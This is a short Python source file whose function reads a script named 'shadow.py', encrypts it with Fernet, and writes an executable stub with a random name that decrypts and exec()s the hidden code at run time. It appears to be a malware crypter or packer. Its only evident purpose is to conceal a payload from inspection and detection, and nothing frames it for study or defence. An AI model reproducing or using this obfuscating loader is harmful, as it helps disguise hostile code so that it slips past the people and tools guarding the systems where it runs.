import os
import base64
import random
import string
from cryptography.fernet import Fernet

def generate_payload(script_path="shadow.py"):
    with open(script_path, 'r') as f:
        code = f.read()
    
    key = Fernet.generate_key()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(code.encode())
    
    stub = f'''#!/usr/bin/env python3
import base64, subprocess, os, sys
from cryptography.fernet import Fernet

payload = "{base64.b64encode(encrypted).decode()}"
key = "{base64.b64encode(key).decode()}"

fernet = Fernet(base64.b64decode(key))
decrypted = fernet.decrypt(base64.b64decode(payload))
exec(decrypted.decode())
'''
    
    payload_file = f"payload_{''.join(random.choices(string.ascii_lowercase, k=6))}.py"
    with open(payload_file, 'w') as f:
        f.write(stub)
    
    os.chmod(payload_file, 0o755)
    return payload_file